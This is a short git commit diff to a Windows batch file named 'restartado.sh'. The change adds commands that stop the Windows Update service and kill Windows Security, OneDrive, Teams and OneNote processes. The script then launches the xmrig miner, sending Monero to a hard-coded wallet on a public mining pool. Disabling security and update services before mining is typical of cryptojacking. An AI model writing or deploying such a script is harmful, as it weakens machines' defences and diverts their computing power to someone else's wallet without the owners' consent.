9a9b0599b98510a78f5297984bb1a13411883211
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-02 17:12:22 -0300

    Update restartado.sh

--- restartado.sh
+++ restartado.sh
@@ -1,5 +1,13 @@
 @echo off
 net stop WUAUSERV
+echo %time%
+timeout 40 > NUL
+net stop WUAUSERV
+taskkill /IM OneDrive.exe
+taskkill /IM SecurityHealthSystray.exe
+taskkill /IM SecurityHealthService.exe
+taskkill /IM ONENOTEM.exe
+taskkill /IM Teams.exe
 cd /d "%~dp0"
 xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Nao-Reiniciado-02-01-CMD -p x -t 8
 pause 
